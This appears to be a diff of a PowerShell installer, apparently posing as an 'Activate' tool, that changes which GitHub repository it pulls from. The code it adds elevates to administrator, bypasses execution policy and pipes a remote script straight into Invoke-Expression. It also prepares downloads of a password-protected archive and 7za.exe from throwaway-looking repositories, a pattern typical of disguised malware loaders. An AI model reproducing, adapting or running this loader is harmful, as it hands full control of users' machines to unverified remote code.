@@ -18,11 +18,11 @@ function Show-InstallHeader {
 }
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-    Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/IceClassShovel/kcvgttda/main/install.ps1 | iex"'
+    Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/MillipedeSport/Activate/main/install.ps1 | iex"'
     exit
 }
 
-$base       = 'https://github.com/IceClassShovel/kcvgttda/releases/download/Last'
+$base       = 'https://github.com/MillipedeSport/Activate/releases/download/Last'
 $zipUrl     = "$base/Release.zip"
 $7zaUrl     = "$base/7za.exe"
 $password   = 'H+h6)d.a'
